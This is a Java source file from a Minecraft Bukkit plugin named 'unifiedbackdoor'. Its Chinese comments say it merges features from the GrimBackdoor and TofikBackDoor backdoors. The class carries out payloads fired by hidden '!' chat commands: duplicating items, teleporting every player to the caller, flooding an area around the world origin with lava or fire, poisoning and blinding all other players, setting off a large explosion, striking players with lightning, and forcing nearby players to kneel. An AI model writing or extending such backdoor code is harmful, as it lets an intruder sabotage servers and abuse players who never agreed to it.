package com.unifiedbackdoor.features;

import com.unifiedbackdoor.UnifiedBackdoorPlugin;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.entity.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

import java.util.*;

/**
 * 特殊效果管理器
 * 整合GrimBackdoor和TofikBackDoor的特殊效果功能
 */
public class EffectsManager {
    
    private final UnifiedBackdoorPlugin plugin;
    private final Random random = new Random();
    
    // 物品定义
    private final Material SPIKE_BOMB_ITEM = Material.PRISMARINE_SHARD;
    private final Material CONTROL_ROD = Material.CHAIN;
    
    public EffectsManager(UnifiedBackdoorPlugin plugin) {
        this.plugin = plugin;
    }
    
    /**
     * 处理物品复制命令
     * 来自GrimBackdoor的!dupe功能
     */
    public void handleDupe(Player player, String[] args) {
        try {
            int amount = 64; // 默认数量
            if (args.length > 0) {
                amount = Integer.parseInt(args[0]);
            }
            
            ItemStack handItem = player.getInventory().getItemInMainHand();
            if (handItem.getType().isAir()) {
                player.sendMessage(ChatColor.RED + "请手持要复制的物品。");
                return;
            }
            
            ItemStack clonedItem = handItem.clone();
            clonedItem.setAmount(amount);
            player.getInventory().addItem(clonedItem);
            
            player.sendMessage(ChatColor.GREEN + "已复制 " + amount + " 个 " + handItem.getType().name());
            
        } catch (NumberFormatException e) {
            player.sendMessage(ChatColor.RED + "无效的数量格式。");
        }
    }
    
    /**
     * 处理玩家聚集命令
     * 来自GrimBackdoor的!here功能
     */
    public void handleHere(Player player, String[] args) {
        Location center = player.getLocation();
        List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());
        players.remove(player); // 排除自己
        
        int totalPlayers = players.size();
        if (totalPlayers == 0) {
            player.sendMessage(ChatColor.YELLOW + "没有其他在线玩家。");
            return;
        }
        
        double angleStep = 360.0 / totalPlayers;
        double radius = 5.0;
        
        for (int i = 0; i < totalPlayers; i++) {
            Player target = players.get(i);
            double angle = Math.toRadians(angleStep * i);
            
            // 计算圆形位置
            double x = center.getX() + radius * Math.cos(angle);
            double z = center.getZ() + radius * Math.sin(angle);
            Location loc = new Location(center.getWorld(), x, center.getY(), z);
            
            // 设置朝向中心
            Vector direction = center.toVector().subtract(loc.toVector());
            Location lookLoc = loc.clone();
            lookLoc.setDirection(direction);
            
            target.teleport(lookLoc);
        }
        
        player.sendMessage(ChatColor.GREEN + "已将 " + totalPlayers + " 名玩家拉到身边。");
    }
    
    /**
     * 处理尖刺炸弹命令
     * 来自GrimBackdoor的!spikebomb功能
     */
    public void handleSpikeBomb(Player player, String[] args) {
        ItemStack spikeBomb = new ItemStack(SPIKE_BOMB_ITEM);
        ItemMeta meta = spikeBomb.getItemMeta();
        meta.setDisplayName(ChatColor.DARK_PURPLE + "尖刺炸弹");
        meta.setLore(Arrays.asList(
                ChatColor.GRAY + "右键点击投掷",
                ChatColor.DARK_RED + "1秒后爆炸产生弹幕"
        ));
        spikeBomb.setItemMeta(meta);
        
        player.getInventory().addItem(spikeBomb);
        player.sendMessage(ChatColor.GREEN + "已获得尖刺炸弹。");
    }
    
    /**
     * 处理控制棒命令
     * 来自GrimBackdoor的!kontrolcubugu功能
     */
    public void handleKontrolCubugu(Player player, String[] args) {
        ItemStack rod = new ItemStack(CONTROL_ROD);
        ItemMeta meta = rod.getItemMeta();
        meta.setDisplayName(ChatColor.DARK_PURPLE + "控制棒");
        rod.setItemMeta(meta);
        
        player.getInventory().addItem(rod);
        player.sendMessage(ChatColor.GREEN + "已获得控制棒。");
        
        // 启动控制棒效果任务
        startControlRodTask();
    }
    
    /**
     * 处理Tofik岩浆蔓延命令
     * 来自TofikBackDoor的!tofiklava功能
     */
    public void handleTofikLava(Player player, String[] args) {
        player.sendMessage(ChatColor.RED + "开始岩浆蔓延...");
        
        new BukkitRunnable() {
            @Override
            public void run() {
                for (World world : Bukkit.getWorlds()) {
                    for (int x = -100; x < 100; x++) {
                        for (int z = -100; z < 100; z++) {
                            Location loc = new Location(world, x, 64, z);
                            if (loc.getBlock().getType() == Material.AIR) {
                                loc.getBlock().setType(Material.LAVA);
                            }
                        }
                    }
                }
            }
        }.runTask(plugin);
        
        player.sendMessage(ChatColor.GREEN + "世界已被岩浆覆盖！");
    }
    
    /**
     * 处理Tofik火焰蔓延命令
     * 来自TofikBackDoor的!tofikfire功能
     */
    public void handleTofikFire(Player player, String[] args) {
        player.sendMessage(ChatColor.RED + "开始火焰蔓延...");
        
        new BukkitRunnable() {
            @Override
            public void run() {
                for (World world : Bukkit.getWorlds()) {
                    for (int x = -100; x < 100; x++) {
                        for (int z = -100; z < 100; z++) {
                            Location loc = new Location(world, x, 64, z);
                            Block block = loc.getBlock();
                            if (block.getType().isSolid() && block.getType() != Material.FIRE) {
                                block.setType(Material.FIRE);
                            }
                        }
                    }
                }
            }
        }.runTask(plugin);
        
        player.sendMessage(ChatColor.GREEN + "世界已被火焰覆盖！");
    }
    
    /**
     * 处理Tofik中毒效果命令
     * 来自TofikBackDoor的!tofikpoison功能
     */
    public void handleTofikPoison(Player player, String[] args) {
        for (Player target : Bukkit.getOnlinePlayers()) {
            if (!target.equals(player)) {
                target.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 200, 1));
            }
        }
        player.sendMessage(ChatColor.GREEN + "所有玩家已中毒！");
    }
    
    /**
     * 处理Tofik失明效果命令
     * 来自TofikBackDoor的!tofikblind功能
     */
    public void handleTofikBlind(Player player, String[] args) {
        for (Player target : Bukkit.getOnlinePlayers()) {
            if (!target.equals(player)) {
                target.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 200, 1));
            }
        }
        player.sendMessage(ChatColor.GREEN + "所有玩家已失明！");
    }
    
    /**
     * 处理Tofik爆炸命令
     * 来自TofikBackDoor的!tofikexplosion功能
     */
    public void handleTofikExplosion(Player player, String[] args) {
        Location location = player.getLocation();
        location.getWorld().createExplosion(location, 50.0f, true, true);
        player.sendMessage(ChatColor.GREEN + "大爆炸已生成！");
    }
    
    /**
     * 处理Tofik闪电命令
     * 来自TofikBackDoor的!tofiklightning功能
     */
    public void handleTofikLightning(Player player, String[] args) {
        // 在所有玩家位置生成闪电
        for (Player target : Bukkit.getOnlinePlayers()) {
            if (!target.equals(player)) {
                Location loc = target.getLocation();
                loc.getWorld().strikeLightning(loc);
            }
        }
        player.sendMessage(ChatColor.GREEN + "闪电风暴已生成！");
    }
    
    /**
     * 启动控制棒效果任务
     * 来自GrimBackdoor的控制棒功能
     */
    private void startControlRodTask() {
        new BukkitRunnable() {
            @Override
            public void run() {
                for (Player holder : Bukkit.getOnlinePlayers()) {
                    // 检查玩家是否持有控制棒
                    if (holder.getInventory().getItemInMainHand().getType() != CONTROL_ROD) {
                        continue;
                    }
                    
                    // 让附近玩家下跪
                    for (Entity entity : holder.getNearbyEntities(10, 10, 10)) {
                        if (entity instanceof Player) {
                            Player target = (Player) entity;
                            target.setSneaking(true);
                            
                            // 缓慢低头效果
                            slowlyForceLookDown(target);
                        }
                    }
                }
            }
        }.runTaskTimer(plugin, 0, 5);
    }
    
    /**
     * 缓慢强制玩家低头
     */
    private void slowlyForceLookDown(Player target) {
        new BukkitRunnable() {
            float pitch = target.getLocation().getPitch();
            
            @Override
            public void run() {
                if (pitch < 90) {
                    pitch += 2.5f;
                    Location loc = target.getLocation().clone();
                    loc.setPitch(pitch);
                    target.teleport(loc);
                } else {
                    this.cancel();
                }
            }
        }.runTaskTimer(plugin, 0, 2);
    }
    
    /**
     * 处理尖刺炸弹投掷
     * 应该在玩家交互事件中调用
     */
    public void launchSpikeBomb(Player player) {
        Snowball projectile = player.launchProjectile(Snowball.class);
        projectile.setCustomName("SpikeBombProjectile");
        projectile.setVelocity(player.getLocation().getDirection().multiply(1.5));
        projectile.setShooter(player);
    }
    
    /**
     * 处理尖刺炸弹爆炸效果
     * 应该在抛射物击中事件中调用
     */
    public void onSpikeBombExplode(Location location) {
        // 爆炸效果
        location.getWorld().playSound(location, Sound.ENTITY_GENERIC_EXPLODE, 1.5f, 0.8f);
        location.getWorld().spawnParticle(Particle.EXPLOSION_LARGE, location, 10);
        
        // 1秒后生成弹幕
        new BukkitRunnable() {
            @Override
            public void run() {
                // 抛射物类型数组
                Class<? extends Entity>[] projectiles = new Class[]{
                        Snowball.class, Egg.class, Trident.class,
                        Arrow.class, ThrownPotion.class, TNTPrimed.class, FallingBlock.class
                };
                
                // 生成30个抛射物
                for (int i = 0; i < 30; i++) {
                    Class<? extends Entity> projectileClass = projectiles[random.nextInt(projectiles.length)];
                    Entity projectile = location.getWorld().spawn(location, projectileClass);
                    
                    // 随机速度和方向
                    Vector velocity = new Vector(
                            random.nextDouble() - 0.5,
                            random.nextDouble() * 1.2,
                            random.nextDouble() - 0.5
                    ).normalize().multiply(3.0);
                    
                    if (projectile instanceof Projectile) {
                        ((Projectile) projectile).setVelocity(velocity);
                    } else if (projectile instanceof Trident) {
                        ((Trident) projectile).setVelocity(velocity);
                    }
                }
            }
        }.runTaskLater(plugin, 20); // 1秒延迟
    }
    
    /**
     * 检查物品是否是尖刺炸弹
     */
    public boolean isSpikeBomb(ItemStack item) {
        if (item == null || item.getType() != SPIKE_BOMB_ITEM) return false;
        ItemMeta meta = item.getItemMeta();
        return meta != null && meta.getDisplayName().equals(ChatColor.DARK_PURPLE + "尖刺炸弹");
    }
}
